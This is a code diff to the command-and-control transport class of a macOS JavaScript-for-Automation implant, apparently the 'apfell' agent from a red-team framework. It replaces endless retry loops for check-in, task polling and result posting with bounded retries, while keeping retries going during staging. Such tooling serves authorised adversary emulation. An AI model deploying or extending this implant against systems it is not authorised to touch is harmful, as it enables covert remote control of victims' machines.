@@ -379,12 +379,14 @@ class customC2 extends baseC2{
         jsondata = this.make_request("POST", apfell.uuid, info);
     }
     apfell.id = jsondata.id;
+    apfell.checked_in = true;
     // if we fail to get an ID number then exit the application
     if(apfell.id === undefined){ $.NSApplication.sharedApplication.terminate(this); }
     return jsondata;
   }
   getTasking(){
-    while(true){
+        // bail after 10 attempts
+    for(let i = 0; i < 10; i++){
         try{
             let task = this.make_request("GET", apfell.id,  {"tasking_size":1, "action": "get_tasking"});
             return task['tasks'];
@@ -394,6 +396,7 @@ class customC2 extends baseC2{
             $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
         }
     }
+    return [];
   }
   postResponse(task, data){
     //depending on the amount of data we're sending, we might need to chunk it
@@ -402,7 +405,9 @@ class customC2 extends baseC2{
     return this.make_request("POST", apfell.id, postData );
   }
   make_request(method="POST", uid=apfell.id, data=null){
-    while(true){
+    for(let i = 0; i < 10; i++){
+        // try to send a message 10 times and drop it if we still can't send it unless we're trying to stage
+        if(!apfell.checked_in){i = 0;}
       try{
           let req;
           if(method === "POST"){
@@ -452,7 +457,9 @@ class customC2 extends baseC2{
           //console.log("error in make_request: "  + error.toString());
           $.NSThread.sleepForTimeInterval(this.gen_sleep_time());  // don't spin out crazy if the connection fails
       }
+
     }
+    return {};
   }
   download(task, params){
     let output = "";
